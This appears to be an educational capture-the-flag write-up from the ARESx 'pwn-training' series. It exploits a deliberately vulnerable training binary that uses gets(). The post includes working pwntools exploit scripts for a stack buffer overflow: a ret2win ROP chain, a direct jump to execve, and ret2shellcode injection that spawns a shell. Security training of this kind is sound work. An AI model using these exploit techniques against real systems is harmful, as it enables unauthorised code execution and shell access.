I"£B<h3 id="introduction">Introduction:</h3>

<p>This is an initiative taken by team members of ARESx. In this series of <code class="language-plaintext highlighter-rouge">pwn-training</code> we will be looking into various types of attacks performed on binaries. This in the first part of the series. We will start of slow with a simple return to shellcode challenge. Most of the challenge binary‚Äôs code will also be provided.</p>

<h3 id="challenge">Challenge:</h3>

<p>Here we are given a binary and the source for the binary.</p>

<p><a href="/assets/images/pwntraining1/ret2shellcode">vuln binary</a> and 
<a href="/assets/images/pwntraining1/ret2shellcode.c">vuln c code</a></p>

<h3 id="solution">Solution:</h3>

<h4 id="mitigations">Mitigations:</h4>

<p>Before going into the exploitation its better to check what mitigations are enabled for a bianry. Mitigations are protections that were included to avoid certain attacks. For example.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec <span class="nt">--file</span> ./ret2shellcode
</code></pre></div></div>

<p><img src="/assets/images/pwntraining1/pwntrain1.png" alt="" /></p>

<p>If you don‚Äôt have checksec installed then</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt <span class="nb">install </span>checksec
</code></pre></div></div>

<p>RELRO:</p>
<ul>
  <li>Partial RELRO - in attackers point of view, does nothing but leaves the got writeable.</li>
  <li>Full RELRO    - makes the GOT read-only therefore mitigating the ‚Äúgot-overwrite‚Äù attack. (got-overwrite coming soon ;) )</li>
</ul>

<p>CANARY:</p>
<ul>
  <li>its a set of characters stored on the stack to make sure no buffer overflows takes place. (we can bypass this later)</li>
</ul>

<p>No eXecute:</p>
<ul>
  <li>NX Enabled - this makes sure that the code on the stack is not excecuted.(not that simple but lets go with this for now)</li>
  <li>NX Disabled - yea you guessed it. the code on the stack can be excecuted.</li>
</ul>

<p>PIE:</p>
<ul>
  <li>position independent excecutable: will randomise the address of the code and PLT.</li>
  <li>point to note : the libc address will always be different cause they are PIC (Position Independent Code). Even they dont know where they are laoded lmao.</li>
</ul>

<p>RWX:</p>
<ul>
  <li>Read, write and execute : It‚Äôll tell us if the binary has segments that we can write and excecute.</li>
</ul>

<h4 id="code-walkthrough">Code walkthrough:</h4>

<p>IF you are a curious assembly code lover make sure to head over to the gdb and dig deep. Here I‚Äôll go through the c code since its a basic writeup.</p>

<p><img src="/assets/images/pwntraining1/pwntrain2.png" alt="" /></p>

<p>Just ignore the ignore_me() function its for standard buffering and stuff. There are 2 functions called win and main. looking at main we see there is a buf variable with size 0x60 and a puts call. There is also a printf that will leak the address of the buf variable [intresting].</p>

<p>There is another function called gets(). we all at this point know its a dangerous function. lets see why.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>man gets
</code></pre></div></div>
<p><img src="/assets/images/pwntraining1/pwntrain3.png" alt="" /></p>

<p>seems like gets will take input as long as there is a newline character which means we can get past the buf variable and mess things in the <code class="language-plaintext highlighter-rouge">stack</code>. So this stack is just a memory region where all the static allocations happen. lets open this in gdb and see what is happening.</p>

<p>I have a different version / flavour of gdb called pwndbg. <a href="https://github.com/pwndbg/pwndbg">link to download</a></p>

<pre><code class="language-gdb">disass main
</code></pre>
<p><img src="/assets/images/pwntraining1/pwntrain4.png" alt="" /></p>

<p>I know a lot of shit is happening but dont worry we only want to set a break point in the return at the end. These breakpoints are stops that‚Äôll happen at specific address that you define when you run the binary in gdb.</p>

<pre><code class="language-gdb">b* 0x0000000000401238
</code></pre>
<p>b for break and give the address of ret at the end of main. Now run the binary and see if you can crash it in someway. Go ahead and see if oyu can get some crash in the binary.</p>

<p>Great if you got a <code class="language-plaintext highlighter-rouge">segfault</code> else no worries. well do it together. run the binary in gdb with <code class="language-plaintext highlighter-rouge">r</code> and then give 0x60 ‚Äúa‚Äùs . this will fill up the buf variable. after those random ‚Äúa‚Äùs maybe create a offset pattern like <code class="language-plaintext highlighter-rouge">111111112222222233333333</code>.</p>
<ul>
  <li>Segfault - its caused because our program is trying to read a part of memory thats invalid in this case it tried to jump to the address <code class="language-plaintext highlighter-rouge">22222222</code></li>
</ul>

<p><img src="/assets/images/pwntraining1/pwntrain5.jpg" alt="" /></p>

<p>ooof dont worry. there is a lot of information about different registers in the image but we are particularly intrested in 1 register called rsp. The rsp is the stack pointer or the register that holds infomartion about the next location to excecute. But do you see something fishy there ? Exactly we can control the return address of main. This means that we can make the binary excecute what we want.</p>

<h4 id="aim">Aim:</h4>

<p>As an attacker our aim is to make this binary give a shell for us in the server. So we looked at a win() function earlier, this will land us a nice neat shell! Tho there wont be any win() function in real life applications, its your task to somehow find ways to get a shell in the server.</p>

<h4 id="return-to-win">Return to win:</h4>

<p>now since we control the return address of main why not lets change the return address to win function?</p>
<ul>
  <li>Win function does execve(‚Äú/bin/sh‚Äù) -&gt; which means that it‚Äôll call a system function called <code class="language-plaintext highlighter-rouge">execve</code> and excecute the command <code class="language-plaintext highlighter-rouge">/bin/sh</code> which is a shell.</li>
</ul>

<p>ok lets start writing our script in python. First we will import pwntools library to make things easier. next we will connect to our binary and send/recieve messages.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"ret2shellcode"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">b"a"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="s">b"a"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011a5</span><span class="p">))</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>Here in the sendline command I am giving ‚Äúa‚Äù * 0x60 to fill the buf variable and extra ‚Äúa‚Äù * 8 to fill the rbp (base pointer) and then the address of win function. wait what is that p64() ? -&gt; p64() function will make your address into little endian format.</p>

<p>Run this script and lets see what we get. SHOOT you get something called EOF (End Of File) ?</p>

<p><img src="/assets/images/pwntraining1/pwntrain6.png" alt="" /></p>

<p>You can attach a gdb with your script and see where your script will crash / how it runs. But we are already given the c code and we know that there was some additional checks done to the <code class="language-plaintext highlighter-rouge">execve</code>.</p>

<p><img src="/assets/images/pwntraining1/pwntrain7.png" alt="" /></p>

<p>So we have to somehow make the arg1 = 0xdeadbeef and arg2 = 0xcafebabe. This is where return oriented programming comes into picture.</p>

<h5 id="return-oriented-programming">Return Oriented Programming:</h5>

<p>This is a type of attack where we use static code or code thats been used to make this binary. we will combine one or many such code snippets to form a chain that‚Äôll do something valuable to us.</p>

<ul>
  <li>Since win is a function with arg1 and arg2 as parameters. We have to know that the parameters to a function is given through registers and specifically by RDI, RSI, RDX for the first, second, and third arguments respectively.</li>
  <li>so we can set RDI = 0xdeadbeef and RSI = 0xcafebabe. then call win function.</li>
</ul>

<h4 id="exploit-ret2win">Exploit [ret2win]:</h4>

<p>Firstly we can get all the gadgets in the binary with <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>. Then lets take out the ones that we want.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ROPgadget.py <span class="nt">--binary</span> ../Documents/pwn-train/pwn1/ret2shellcode
</code></pre></div></div>

<p><img src="/assets/images/pwntraining1/pwntrain8.png" alt="" /></p>

<p>add the gadgets in the list and then give the values then call win function. HOORAY !!!</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"ret2shellcode"</span><span class="p">)</span>
<span class="n">pause</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">b"a"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="s">b"a"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040129b</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000401299</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011a5</span><span class="p">))</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>

</code></pre></div></div>
<p><img src="/assets/images/pwntraining1/pwntrain9.png" alt="" /></p>

<h4 id="exploit-simpler-version">Exploit [simpler version]:</h4>

<p>I know you went through all the struggle to set the arguments right. But if you can control the return address and jump literally anywhere, then why not just jump directly on the execve function.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"ret2shellcode"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">b"a"</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="s">b"a"</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004011d1</span><span class="p">))</span> <span class="c1"># address to execve
</span><span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h4 id="return-2-shellcode">return 2 shellcode:</h4>

<p>This is the third and final way that well discuss in this blog. Do you remember the leak at the begining ? Yes we will use the leak to get a shell. this time ignore the win() function. without the help of helper function get a shell yourself :D .</p>

<p>Remember at the begining I said this binary is NX disabled. So we can basically store the commands that we want to excecute in buf variable and then jump back to the buf variable thereby excecuting whatever we want.</p>

<ul>
  <li>first step is to store the leak in a variable. We will use recvline function here.</li>
  <li>write all the commands that you want to excecute (pwntools has inbuilt functionalities :D )</li>
  <li>fill the gap between the return and the shellcode (shellcode -&gt; all the commands to be excecuted )</li>
  <li>jump back to buf variable.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
	<span class="k">global</span> <span class="n">p</span>
	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
	<span class="k">else</span><span class="p">:</span>
		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span> <span class="c1"># start the process.
</span>
<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./ret2shellcode'</span><span class="p">)</span> 
<span class="n">start</span><span class="p">()</span>

<span class="n">buf_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">()[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="c1"># recvlines and then get the leak
</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">linux</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span> <span class="c1"># generates a shellcode compatible with linux systems
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">b'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="p">(</span><span class="mi">104</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="c1"># spans the gap between buf variable and return 
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span> <span class="c1"># address of the buf variable
</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="c1"># send the payload
</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span> <span class="c1"># doesnt close the shell and keeps it open for us.
</span><span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Hope you liked the pwn training 1. More training writeups coming soon ! :D</p>
:ET